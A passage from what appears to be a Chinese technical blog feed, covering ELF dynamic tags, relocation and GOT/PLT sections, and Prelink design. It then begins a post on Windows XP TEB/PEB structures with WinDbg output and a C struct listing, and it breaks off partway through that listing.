Values)范围的上限。这些值都遵循d_un联合体的解释规则。<br><code>DT_VALRNGLO</code>：用于Elfxx_Dyn结构的d_un.d_val字段的值的范围的下限。<br><code>DT_GNU_PRELINKE</code>：d_val。此元素保存Prelinking的时间戳。<br><code>DT_GNU_CONFLICTSZ</code>：<br><code>DT_GNU_LIBLISTSZ</code>：<br><code>DT_CHECKSUM</code>：<br><code>DT_PLTPADSZ</code>：<br><code>DT_MOVEENT</code>：<br><code>DT_MOVESZ</code>：<br><code>DT_FEATURE_1</code>：<br><code>DT_POSFLAG_1</code>：<br><code>DT_SYMINSZ</code>：<br><code>DT_SYMINENT</code>：<br><code>DT_VALRNGHI</code>：用于Elfxx_Dyn结构的d_un.d_val字段的值的范围的上限。<br><code>DT_ADDRRNGLO</code>：<br><code>DT_GNU_HASH</code>：<br><code>DT_TLSDESC_PLT</code>：<br><code>DT_TLSDESC_GOT</code>：<br><code>DT_GNU_CONFLICT</code>：<br><code>DT_GNU_LIBLIST</code>：<br><code>DT_CONFIG</code>：<br><code>DT_DEPAUDIT</code>：<br><code>DT_AUDIT</code>：<br><code>DT_PLTPAD</code>：<br><code>DT_MOVETAB</code>：<br><code>DT_SYMINFO</code>：<br><code>DT_ADDRRNGHI</code>：<br><code>DT_VERSYM</code>：<br><code>DT_RELACOUNT</code>：<br><code>DT_RELCOUNT</code>：<br><code>DT_FLAGS_1</code>：<br><code>DT_VERDEF</code>：<br><code>DT_VERDEFNUM</code>：<br><code>DT_VERNEED</code>：<br><code>DT_VERNEEDNUM</code>：<br><code>DT_LOPROC</code>：<br><code>DT_SPARC_REGISTER</code>：<br><code>DT_AUXILIARY</code>：<br><code>DT_USED</code>：<br><code>DT_FILTER</code>：<br><code>DT_HIPROC</code>：</p><h3 id="5-10-Relocation-Related-Sections"><a href="#5-10-Relocation-Related-Sections" class="headerlink" title="5.10 Relocation Related Sections"></a>5.10 Relocation Related Sections</h3><h4 id="5-10-1-rel-a-dyn"><a href="#5-10-1-rel-a-dyn" class="headerlink" title="5.10.1 .rel(a).dyn"></a>5.10.1 .rel(a).dyn</h4><h4 id="5-10-2-rel-a-plt"><a href="#5-10-2-rel-a-plt" class="headerlink" title="5.10.2 .rel(a).plt"></a>5.10.2 .rel(a).plt</h4><h4 id="rel-a-xxxx"><a href="#rel-a-xxxx" class="headerlink" title=".rel(a).xxxx"></a>.rel(a).xxxx</h4><p>可重定位文件中<br>.rel.text</p><p>.rel.data</p><h3 id="5-11-Global-Offset-Table"><a href="#5-11-Global-Offset-Table" class="headerlink" title="5.11 Global Offset Table"></a>5.11 Global Offset Table</h3><h4 id="5-11-1-got"><a href="#5-11-1-got" class="headerlink" title="5.11.1 .got"></a>5.11.1 .got</h4><h4 id="5-11-2-got-plt"><a href="#5-11-2-got-plt" class="headerlink" title="5.11.2 .got.plt"></a>5.11.2 .got.plt</h4><h3 id="5-12-Procedure-Linkage-Table"><a href="#5-12-Procedure-Linkage-Table" class="headerlink" title="5.12 Procedure Linkage Table"></a>5.12 Procedure Linkage Table</h3><h4 id="5-12-1-plt"><a href="#5-12-1-plt" class="headerlink" title="5.12.1 .plt"></a>5.12.1 .plt</h4><h4 id="5-12-2-plt-got"><a href="#5-12-2-plt-got" class="headerlink" title="5.12.2 .plt.got"></a>5.12.2 .plt.got</h4><h3 id="5-13-eh-frame-Related"><a href="#5-13-eh-frame-Related" class="headerlink" title="5.13 .eh_frame Related"></a>5.13 .eh_frame Related</h3><h4 id="5-13-1-eh-frame-hdr"><a href="#5-13-1-eh-frame-hdr" class="headerlink" title="5.13.1 .eh_frame_hdr"></a>5.13.1 .eh_frame_hdr</h4><h4 id="5-13-2-eh-frame"><a href="#5-13-2-eh-frame" class="headerlink" title="5.13.2 .eh_frame"></a>5.13.2 .eh_frame</h4><h3 id="Thread-Local-Storage-Section"><a href="#Thread-Local-Storage-Section" class="headerlink" title="Thread-Local Storage Section"></a>Thread-Local Storage Section</h3><h4 id="tdata-amp-tdata1"><a href="#tdata-amp-tdata1" class="headerlink" title=".tdata &amp; .tdata1"></a>.tdata &amp; .tdata1</h4><h4 id="tbss"><a href="#tbss" class="headerlink" title=".tbss"></a>.tbss</h4><p>.debug</p><h3 id="Prelink-Related-Sections"><a href="#Prelink-Related-Sections" class="headerlink" title="Prelink Related Sections"></a>Prelink Related Sections</h3><p>&emsp;&emsp;Prelink是一种旨在加速ELF程序在各种Linux架构上的动态链接(Dynamic Linking)的工具。</p><p>&emsp;&emsp;1995年，Linux将其二进制格式从a.out更改为ELF。a.out二进制格式非常不灵活，而且很难构建共享库(Shared Libraries)。Linux在a.out中的共享库是位置相关(Position Dependent)的，并且在链接时必须为每个共享库分配一个唯一的虚拟地址空间槽(Virtual Address Space Slot)。即使只有几个共享库，维护这些分配也非常困难，过去有一个由人以文本文件形式维护的集中的地址注册表(Central Address Registry)，但是，当有成千上万个不同的共享库，它们的大小、版本和导出符号都在不断变化时，这肯定是不可能做到的。另一方面，为了加载这些共享库，动态链接器(Dynamic Linker)只需要做最少量的工作，因为重定位处理(Relocation Handling)和符号查找(Symbol Lookup)仅在链接时完成。动态链接器使用uselib系统调用，它只是将命名库(Named Library)映射到地址空间[没有段(Segment)或节(Section)保护差异，整个映射是可写和可执行的]。</p><p>&emsp;&emsp;ELF二进制格式是最灵活的二进制格式之一，它的共享库(Shared Libraries)易于构建，并且不需要集中分配(Central Assignment)虚拟地址空间槽(Virtual Address Space Slot)。共享库与位置无关(Position Independent)，重定位处理(Relocation Handling)和符号查找(Symbol Lookup)，部分在创建可执行文件时完成，部分在运行时完成。通过预加载(Preloading)一个定义这些符号的新共享库，或者没有通过添加符号到之前在符号查找时搜索到的共享库来重新链接可执行文件，或者通过向程序使用的库中添加新的依赖共享库，可以在运行时覆盖共享库中的符号。所有这些改进都有其代价，即程序启动速度较慢、每个进程具有更多的非共享内存，以及与共享库中的位置无关代码(Position Independent Code)相关的运行时成本。</p><p>&emsp;&emsp;ELF程序的程序启动比使用共享库的a.out程序的启动慢，因为动态链接器(Dynamic Linker)在调用程序入口点之前有更多的工作要做。加载库(Loading Libraries)的成本稍大一些，因为ELF共享库通常具有单独的只读段(Read-Only Segments)和可写段(Writable Segments)，因此动态链接器必须为每个段使用不同的内存保护。主要的区别在于重定位处理(Relocation Handling)和相关联的符号查找(Associated Symbol Lookup)。在a.out格式中，运行时没有重定位处理或符号查找。在ELF格式中，这一成本比过去在Linux中从a.out到ELF过渡期间要重要得多，特别是现在GUI程序不断增长，并开始使用越来越多的共享库。5年前，使用超过10个共享库的程序非常少见，如今大多数GUI程序链接到大约40个或更多共享库，在极端情况下，程序甚至使用90多个共享库。每个共享库都会将其动态重定位集添加到成本中并扩大符号搜索范围，因此除了执行更多符号查找之外，应用程序必须执行的每一次符号查找的平均代价都更高。另一个增加成本的因素是在共享库的符号哈希表(Symbol Hash Table)中查找符号时必须比较符号名称的长度。C++库往往具有极长的符号名称，不幸的是，新的C++ ABI将命名空间(Namespaces)和类名(Class Names)放在最前面，方法名(Method Names)放在最后，因此符号名称通常仅在很长名称的最后几个字节上有所不同。</p><p>&emsp;&emsp;每次应用重定位时，包含要写入的地址的整个内存页都必须加载到内存中。操作系统执行写时复制(Copy-on-Write)操作，这也导致内存页的物理内存(Physical Memory)不能再与其他进程共享。使用ELF，通常所有程序的全局偏移表(Global Offset Table)，包含指向共享库中对象的指针的常量和变量等都在动态链接器(Dynamic Linker)将控制权交给程序之前写入。</p><p>&emsp;&emsp;在大多数架构上(除了一些例外，如AMD64架构)位置无关代码(Position Independent Code)要求一个寄存器需要专门用作PIC寄存器，因此不能在函数中用于其他目的。这尤其会降低寄存器匮乏(Register-Starved)架构(如：IA-32)的性能。此外，需要一些代码来设置PIC寄存器，要么作为函数序言(Function Prologues)的一部分调用，要么在调用序列中使用函数描述符(Function Descriptors)时调用。</p><p>&emsp;&emsp;Prelink是一个工具，它与相应的动态链接器(Dynamic Linker)和链接器(Linker)更改一起尝试将一些a.out的优势(例如：速度和更少的COW页面)带到ELF二进制格式，同时保留其所有的灵活性。它还以有限的方式尝试减少由重定位创建的不可共享页面(Non-Shareable Pages)的数量。Prelink与GNU C库中的动态链接器密切配合，但是将它移植到其他一些使用动态链接器可以以类似方式修改的平台的ELF中可能并不太难。</p><h4 id="Prelink-Design"><a href="#Prelink-Design" class="headerlink" title="Prelink Design"></a>Prelink Design</h4><p>&emsp;&emsp;Prelink的设计使其需要尽可能少的ELF扩展。它不应该绑定到特定的架构，而应该适用于所有ELF架构。在程序启动期间，它应该避免所有符号查找，如上所示，这是非常耗时的。它需要在共享库和可执行文件不断变化的环境中工作，无论是因为安全更新(Security Updates)还是功能增强(Feature Enhancements)。它应该避免动态链接器(Dynamic Linker)和工具之间的大量代码重复。即使在非预链接(Non-Prelinked)的可执行文件中，或者当共享库(Shared Libraries)之一升级并且可执行文件(Executable Files)的预链接(Prelinking)尚未更新时，预链接的共享库(Prelinked Shared Libraries)也需要可用。</p><p>&emsp;&emsp;为了最大限度地减少启动期间执行的重定位次数，需要尽可能多地重定位共享库和可执行文件。对于相对重定位(Relative Relocations)，这意味着库需要始终加载到相同的基地址，对于其他重定位，这意味着必须始终加载具有这些重定位解析到的定义的所有共享库(通常包括库或可​​执行文件所依赖的所有共享库)到相同的地址。ELF可执行文件(位置无关可执行文件除外)在链接期间已经固定了它们的加载地址。对于共享库，Prelink需要类似于a.out虚拟地址空间槽(Virtual Address Space Slot)注册表的东西。在所有安装中维护这样的注册表并不能很好地扩展，因此Prelink在查看它应该加速的所有可执行文件及其所有依赖的共享库后，会动态分配这些虚拟地址空间槽。下一步是将共享库实际重定位到分配的基地址。</p><p>&emsp;&emsp;完成后，共享库的实际预链接(Prelinking)就可以完成了。首先，所有依赖的共享库都需要预链接(Prelink不支持共享库之间的循环依赖，只会警告它们而不是Prelinking循环依赖的库)，然后，对于共享库中的每个重定位，Prelink都需要查找共享库的自然符号搜索范围(Natural Symbol Search Scope)内的符号(首先是共享库本身，然后是所有依赖的共享库的广度优先搜索)，并将重定位应用于符号的目标节(Symbol’s Target Section)。动态链接器(Dynamic Linker)中的符号查找代码相当复杂和庞大，因此为了避免重复所有这些，Prelink选择使用动态链接器来进行符号查找。动态链接器通过一个特殊的环境变量被告知它应该打印所有执行的符号查找及其类型，并且Prelink通过管道(Pipe)读取此输出。因为其中一个要求是，即使是Non-Prelinked的可执行文件，Prelink的共享库必须是可用的[复制所有的共享库，这样就有了原始的(Pristine)和预链接的(Prelinked)副本，这将对RAM的使用非常不友好]，Prelink必须确保通过应用重定位不会丢失任何信息，因此可以在Non-Prelinked可执行文件的启动时廉价地完成重定位处理。对于RELA架构，这更容易，因为在处理重定位时不需要重定位目标内存的内容。对于REL架构，情况并非如此。Prelink尝试了一些后面描述的技巧，如果失败，需要将REL重定位节转换为RELA格式，其中加数(Addend)存储在重定位节而不是重定位目标的内存中。</p><p>&emsp;&emsp;当一个可执行文件(直接或间接)依赖的所有共享库都被Prelink时，可执行文件中的重定位处理类似于共享库中的重定位。不幸的是，在共享库的自然符号搜索范围(Natural Symbol Search Scope)中查找时(即在共享库Prelink时完成)和在应用程序的全局符号搜索范围(Global Symbol Search Scope)中查找时，并不是所有的符号都有相同的解析。此类符号在本文中被称为冲突(Conflicts)，对这些符号的重定位被称为冲突的重定位(Conflicting Relocations)。冲突取决于可执行文件、及其依赖的所有共享库和它们各自的顺序。它们仅适用于链接到可执行文件的共享库(DT_NEEDED动态标记中提到的库和它们递归依赖的共享库)。Prelink无法预测通过dlopen(3)加载的共享库集，也无法预测这些库加载的顺序，以及它们被卸载的时间。当动态链接器(Dynamic Linker)打印在可执行文件中完成的符号查找时，它也会打印冲突(Conflicts)。然后Prelink针对这些符号进行所有重定位，并构建一个带有冲突修复(Conflict Fixups)的特殊RELA节，并将其存储到Prelink的可执行文件中。此外，所有依赖共享库的列表(按它们在符号搜索范围中出现的顺序)及其校验(Checksums)和和预链接时间(Times of Prelinking)存储在另一个特殊节中。</p><p>&emsp;&emsp;动态链接器(Dynamic Linker)首先检查它本身是否是Prelink的。如果是，就可以避免它的初步重定位处理(这个是在搜索范围内只用动态链接器本身完成的，这样动态链接器中的所有例程都可以轻松使用，没有太多限制)。当它即将启动一个程序时，它首先查看由Prelink创建的库列表节(如果有)，并检查它们是否以相同的顺序出现在符号搜索范围(Symbol Search Scope)内，自Prelink以来没有被修改，并且没有加载任何新的共享库。如果满足所有这些条件，则可以使用Prelink。在这种情况下，动态链接器处理修复部分(Fixup Section)并跳过所有正常的重定位处理。如果不满足一个或多个条件，动态链接器将继续在可执行文件和所有共享库中进行正常的重定位处理。</p><h2 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6 Reference"></a>6 Reference</h2><p>[^1]: <a href="http://refspecs.linuxbase.org/elf/elf.pdf" target="_blank" rel="noopener">Executable and Linking Format(ELF) Specification v1.2</a><br>[^2]: <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank" rel="noopener">WikiPedia - Executable and Linkable Format</a><br>[^3]: <a href="https://wiki.x10sec.org/executable/elf/elf-structure-zh/" target="_blank" rel="noopener">CTF Wiki - ELF 文件格式</a><br>[^4]: <a href="https://www.nixgnauhcuy.top/05d8ba34e313/" target="_blank" rel="noopener">关于嵌入式的 bin、hex、axf、map - 2020</a><br>[^5]: <a href="https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic.html" target="_blank" rel="noopener">Linux Standard Base Core Specification 3.1 - 2005</a><br>[^6]: <a href="https://docs.oracle.com/cd/E53394_01/html/E54813/index.html" target="_blank" rel="noopener">Oracle® Solaris 11.3 Linkers and Libraries Guide - 2018</a><br>[^7]: <a href="https://www.gabriel.urdhr.fr/2015/09/28/elf-file-format/" target="_blank" rel="noopener">Gabriel Corona - The ELF file format - 2015</a><br>[^8]: <a href="http://www.linker-aliens.org/blogs/ali/entry/gnu_hash_elf_sections/" target="_blank" rel="noopener">Oracle Solaris Blog - GNU Hash ELF Sections - 2008</a><br>[^9]: <a href="https://r00tk1ts.github.io/2017/08/24/GNU%20Hash%20ELF%20Sections/" target="_blank" rel="noopener">r00tk1t - GNU Hash ELF Sections(译) - 2017</a><br>[^10]: <a href="http://dandylife.net/blog/archives/686" target="_blank" rel="noopener">Kevin’s Attic - ELF Sections for Exception Handling - 2017</a><br>[^11]: <a href="https://man7.org/linux/man-pages/man5/elf.5.html" target="_blank" rel="noopener">Format of Executable and Linking Format(ELF) files</a><br>[^12]: <a href="https://yuhao0102.github.io/2019/04/11/%E7%BB%8F%E5%85%B8%E5%AD%97%E7%AC%A6%E4%B8%B2hash%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%80%A7%E8%83%BD%E6%AF%94%E8%BE%83/" target="_blank" rel="noopener">icefireelf - 经典字符串hash函数介绍及性能比较 - 2010</a><br>[^13]: <a href="https://jmpews.github.io/2016/12/14/pwn/PWN%E4%B9%8BELF%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">jmpews’s Blog - Pwn之ELF解析 - 2016</a><br>[^14]: <a href="https://blog.csdn.net/npy_lp/article/details/102704732" target="_blank" rel="noopener">程序的本质之三 - ELF文件中与符号(Symbol)相关的Section的定义 - 2019</a><br>[^15]: <a href="https://refspecs.linuxfoundation.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/book1.html" target="_blank" rel="noopener">Linux Standard Base Core Specification 5.0</a></p>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>TEB和PEB</title>
      <link href="/2021/04/14/TEB_and_PEB/"/>
      <url>/2021/04/14/TEB_and_PEB/</url>
      <content type="html"><![CDATA[<blockquote><p>1、这篇文章主要对Windows XP SP3和Windows 7 SP1中的TEB和PEB结构进行对比分析。<br>2、当时对Windows 7下的堆管理算法逆向的时候，涉及到TEB和PEB中的某些结构，所以做了一下总结。<br>3、还没总结完，主要是太费时间了，一些结构可能暂时用不到，后续接触到的时候再补充。<br><a id="more"></a></p></blockquote><h2 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h2><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/index.htm" target="_blank" rel="noopener">Geoff Chappell, Software Analyst - TEB</a></p><h3 id="Windows-XP-SP3-x86"><a href="#Windows-XP-SP3-x86" class="headerlink" title="Windows XP SP3 x86"></a>Windows XP SP3 x86</h3><h4 id="TEB-1"><a href="#TEB-1" class="headerlink" title="_TEB"></a>_TEB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1bc</span> SpareBytes1      : [<span class="number">24</span>] UChar</span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] Uint4B</span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] Uint4B</span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : Uint4B</span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] Uint2B</span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : Ptr32 Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf28</span> HardErrorsAreDisabled : Uint4B</span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">16</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> InDbgPrint       : UChar</span><br><span class="line">   +<span class="number">0xf75</span> FreeStackOnTermination : UChar</span><br><span class="line">   +<span class="number">0xf76</span> HasFiberData     : UChar</span><br><span class="line">   +<span class="number">0xf77</span> IdealProcessor   : UChar</span><br><span class="line">   +<span class="number">0xf78</span> Spare3           : Uint4B</span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : Uint4B</span><br><span class="line">   +<span class="number">0xf88</span> Wx86Thread       : _Wx86ThreadState</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0xf98</span> ImpersonationLocale : Uint4B</span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : Uint4B</span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : Uint4B</span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0xfb4</span> SafeThunkCall    : UChar</span><br><span class="line">   +<span class="number">0xfb5</span> BooleanSpare     : [<span class="number">3</span>] UChar</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xfb8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> <span class="title">NtTib</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line">   VOID* EnvironmentPointer;                                <span class="comment">//0x1c</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">ClientId</span>;</span>                              <span class="comment">//0x20</span></span><br><span class="line">   VOID* ActiveRpcHandle;                                   <span class="comment">//0x28</span></span><br><span class="line">   VOID* ThreadLocalStoragePointer;                         <span class="comment">//0x2c</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span>* <span class="title">ProcessEnvironmentBlock</span>;</span>                    <span class="comment">//0x30</span></span><br><span class="line">   ULONG LastErrorValue;                                    <span class="comment">//0x34</span></span><br><span class="line">   ULONG CountOfOwnedCriticalSections;                      <span class="comment">//0x38</span></span><br><span class="line">   VOID* CsrClientThread;                                   <span class="comment">//0x3c</span></span><br><span class="line">   VOID* Win32ThreadInfo;                                   <span class="comment">//0x40</span></span><br><span class="line">   ULONG User32Reserved[<span class="number">26</span>];                                <span class="comment">//0x44</span></span><br><span class="line">   ULONG UserReserved[<span class="number">5</span>];                                   <span class="comment">//0xac</span></span><br><span class="line">   VOID* WOW32Reserved;                                     <span class="comment">//0xc0</span></span><br><span class="line">   ULONG CurrentLocale;                                     <span class="comment">//0xc4</span></span><br><span class="line">   ULONG FpSoftwareStatusRegister;                          <span class="comment">//0xc8</span></span><br><span class="line">   VOID* SystemReserved1[<span class="number">54</span>];                               <span class="comment">//0xcc</span></span><br><span class="line">   LONG ExceptionCode;                                      <span class="comment">//0x1a4</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_STACK</span> <span class="title">ActivationContextStack</span>;</span> <span class="comment">//0x1a8</span></span><br><span class="line">   UCHAR SpareBytes1[<span class="number">24</span>];                                   <span class="comment">//0x1bc</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span> <span class="title">GdiTebBatch</span>;</span>                       <span class="comment">//0x1d4</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">RealClientId</span>;</span>                          <span class="comment">//0x6b4</span></span><br><span class="line">   VOID* GdiCachedProcessHandle;                            <span class="comment">//0x6bc</span></span><br><span class="line">   ULONG GdiClientPID;                                      <span class="comment">//0x6c0</span></span><br><span class="line">   ULONG GdiClientTID;                                      <span class="comment">//0x6c4</span></span><br><span class="line">   VOID* GdiThreadLocalInfo;                                <span class="comment">//0x6c8</span></span><br><span class="line">   ULONG Win32ClientInfo[<span class="number">62</span>];                               <span class="comment">//0x6cc</span></span><br><span class="line">   VOID* glDispatchTable[<span class="number">233</span>];                              <span class="comment">//0x7c4</span></span><br><span class="line">   ULONG glReserved1[<span class="number">29</span>];                                   <span class="comment">//0xb68</span></span><br><span class="line">   VOID* glReserved2;                                       <span class="comment">//0xbdc</span></span><br><span class="line">   VOID* glSectionInfo;                                     <span class="comment">//0xbe0</span></span><br><span class="line">   VOID* glSection;                                         <span class="comment">//0xbe4</span></span><br><span class="line">   VOID* glTable;                                           <span class="comment">//0xbe8</span></span><br><span class="line">   VOID* glCurrentRC;                                       <span class="comment">//0xbec</span></span><br><span class="line">   VOID* glContext;                                         <span class="comment">//0xbf0</span></span><br><span class="line">   ULONG LastStatusValue;                                   <span class="comment">//0xbf4</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">StaticUnicodeString</span>;</span>              <span class="comment">//0xbf8</span></span><br><span class="line">   USHORT StaticUnicodeBuffer[<span class="number">261</span>];                         <span class="comment">//0xc00</span></span><br><span class="line">   VOID* 